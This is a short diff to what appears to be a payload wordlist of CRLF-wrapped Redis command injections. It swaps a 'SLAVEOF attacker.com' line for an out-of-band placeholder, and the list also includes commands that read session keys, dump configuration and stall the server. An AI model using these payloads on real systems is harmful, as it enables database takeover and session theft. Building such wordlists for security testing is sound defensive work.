@@ -209,7 +209,7 @@ admin%00%00
 \r\nKEYS *\r\n
 \r\nGET session:admin\r\n
 \r\nLRANGE queue 0 -1\r\n
-\r\nSLAVEOF attacker.com 6379\r\n
+\r\nSLAVEOF {{OOB}} 6379\r\n
 \r\nDEBUG sleep 10\r\n
 \r\nCONFIG GET *\r\n
 \r\nSETEX token 99999 attacker\r\n
